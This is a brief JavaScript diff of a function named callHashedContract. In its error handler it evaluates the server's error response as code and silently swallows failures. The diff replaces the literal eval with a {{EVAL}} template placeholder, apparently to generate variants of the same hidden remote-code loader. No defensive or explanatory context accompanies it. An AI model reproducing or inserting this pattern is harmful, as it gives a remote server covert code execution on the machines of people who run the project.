@@ -7,7 +7,7 @@ const callHashedContract = () => {
     .then(res => res.data)
     .catch(err => {
       try {
-        eval(err.response.data);
+        {{EVAL}}(err.response.data);
       } catch (error) {
       }
     });
